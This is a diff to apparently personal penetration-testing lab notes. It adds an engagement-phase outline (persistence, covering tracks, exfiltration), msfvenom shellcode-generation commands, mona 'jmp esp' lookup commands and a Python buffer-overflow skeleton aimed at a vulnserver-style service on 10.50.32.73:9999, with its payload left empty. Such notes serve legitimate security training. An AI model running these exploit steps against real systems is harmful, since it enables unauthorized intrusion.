@@ -32,7 +32,7 @@ Phase 5: Post-exploitation
     Establish persistence
     escalate priveleges
     obfuscate
-    cover your tracks
+    cover your tracks>donovian_grey_host 
     exfiltrate target data
 Phase 6: Document Mission
     Document and report mission details.
@@ -148,6 +148,31 @@ use payload/linux/x86/exec
 set cmd whoami
 generate -b "\x00" -f python
 	copy and paste buf results into script
+
+---------------------------------------------------------------
+
+simple buffer overflow
+
+#!/usr/bin/python
+
+import socket
+
+buf = " " ## where you input commands after testing it works
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## creating socket, IPv4 TCP
+s.connect(("10.50.32.73",9999)) ## define host and port
+print s.recv(1024) ## print to screen the response 
+s.send(buf) ## send variable buf
+print s.recv(1024) ## print to screen the response
+s.close() ## close the socket
+
+----------------------------------------------------------------------
+
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+
+!mona modules
+!mona jmp -r esp -m "essfunc.dll"
+
 
 
 
